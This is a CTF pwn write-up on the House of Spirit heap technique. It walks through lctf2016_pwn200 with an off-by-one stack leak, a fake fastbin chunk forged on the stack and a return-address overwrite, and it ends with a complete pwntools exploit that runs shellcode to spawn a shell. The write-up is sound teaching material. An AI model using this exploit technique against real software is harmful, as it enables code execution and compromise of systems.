---
title: "PWN House_of_Spirit"
tags: ["CTF", "Pwn"]
authors: [nova]
---

Take a look at `House_of_spirit`, which is a technique that relies on constructing `fake_chunk` on the stack to achieve `(almost) arbitrary write`. It depends on `fastbin`.

<!--truncate-->

# how2heap

Overall, it's relatively simple. The key points to note are the need for `16-byte alignment` and the requirement to construct `chunk_size` of `next_fake_chunk` to bypass checks.

![image-20220719220643524](https://oss.nova.gal/img/image-20220719220643524.png)

![image-20220719220923354](https://oss.nova.gal/img/image-20220719220923354.png)

# Practical Combat

## lctf2016_pwn200

![checksec](https://oss.nova.gal/img/image-20220719235857110.png)

No protections are enabled. Planning to go straight for `ret2shellcode`, but we don't have enough bytes for stack overflow.

![400A8E](https://oss.nova.gal/img/image-20220719235308594.png)

The first function `who are u?` has an `Off-by-One` vulnerability that leaks the contents pointed to by `400A8E` `rbp` (which is the `rbp` of the parent function).

```python
def who_are_you(content: bytes) -> bytes:
    sh.sendafter(b'who are u?\n', content)
    sh.recv(0x30)
    return sh.recv(6).ljust(8, b'\x00')

rbp = u64(who_are_you(b'a'*0x30))
print("> rbp:", hex(rbp))
```

![RBP](https://oss.nova.gal/img/image-20220719235609346.png)

The function `read_input()` returns an `int`, and even though `400A8E` is not used, it should be stored at some location on the stack. Based on the assembly, it is located at `[rbp-0x38]`.

![rbp-0x38](https://oss.nova.gal/img/image-20220720000140408.png)

In `400A29`, it can be observed that `dest` is a pointer, `buf` has an overflow of `8` bytes, which can directly overwrite `dest`. Since `dest` will be stored in `ptr` for later `free` and `malloc` operations in the `menu`.

![400A29](https://oss.nova.gal/img/image-20220720000329530.png)

From this point, we can speculate that we can construct a `fake_chunk` in `buf` and manipulate the heap pointer to point to `buf`, creating a `chunk` on the stack. The challenge lies in the `check_out` function where we need to forge `fake_next_chunk_size` as required by `House_of_spirit`.

Calculations reveal that the previous `id` is located at our current `buf+0x68`. Therefore, we could create a `0x50`-sized `chunk` at this location and set the `id` to a value that satisfies `house_of_spirit`.

![fake_next_chunk_size](https://oss.nova.gal/img/image-20220720001354338.png)

As a result, when we execute `free(ptr)`, the address on the stack will be stored in `fastbin`. Subsequently, by `malloc(0x60)` again and writing the corresponding payload to modify the return address, we can obtain a shell.

By observing, we find that the only controllable `ret_addr` is at `ptr+0x40`. With the return address controllable, where should we jump to? Do you remember the `0x30` data we input at the beginning of `who_r_u`? We can write the shellcode there. Just calculate the offset.

![image-20220720002739429](https://oss.nova.gal/img/image-20220720002739429.png)

Complete EXP:

```python
from pwn import *
context(os='linux', arch='amd64', log_level='DEBUG')

sh = process(['./pwn200'])


def who_are_you(content: bytes) -> bytes:
    sh.sendafter(b'who are u?\n', content)
    sh.recv(0x30)
    return sh.recv(6).ljust(8, b'\x00')


def give_id(content: bytes):
    sh.sendafter(b'give me your id ~~?', content)


def give_money(content: bytes):
    sh.sendafter(b'give me money~', content)


def menu(index: int):
    sh.recvuntil(b"your choice : ")
    if index == 1:
        sh.sendline(b"1")
    elif index == 2:
        sh.sendline(b"2")
        sh.recvuntil(b"out~")
    elif index == 3:
        sh.sendline(b"3")
        sh.recvuntil(b'good bye~')


def check_in(length_: bytes, content: bytes):
    sh.sendlineafter(b'how long?', length_)
    sh.sendlineafter(length_ + b'\n', content)
    sh.recvuntil(b"in~")


def gdb_(time_: int = None, arg: str = None):
    gdb.attach(sh, arg)
    pause(time_)


rbp = u64(who_are_you(asm(shellcraft.sh()).ljust(0x30, b'\x00')))
# rbp = u64(who_are_you(b'a'*0x30))
print("> rbp:", hex(rbp))
give_id(b'2333')  # next_fake_chunk_size
payload = p64(0) + p64(0x60) + b'\x00'*(0x40-0x10-0x08) + p64(rbp-0xb0)
give_money(payload)

menu(2)
ret_addr = rbp - 0x50
payload = b'\x00'*0x38 + p64(ret_addr) + b'\x00'*0x0F
menu(1)
check_in(b'80', payload)
menu(3)
sh.interactive()

```

# 2014_hack.lu_oreo

The bug that is quite puzzling (where `pwntools` cannot capture `Action`) was presented by LaughingMan. We'll discuss it later, have fun.

![image-20220720204517147](https://oss.nova.gal/img/image-20220720204517147.png)

<!-- AI -->
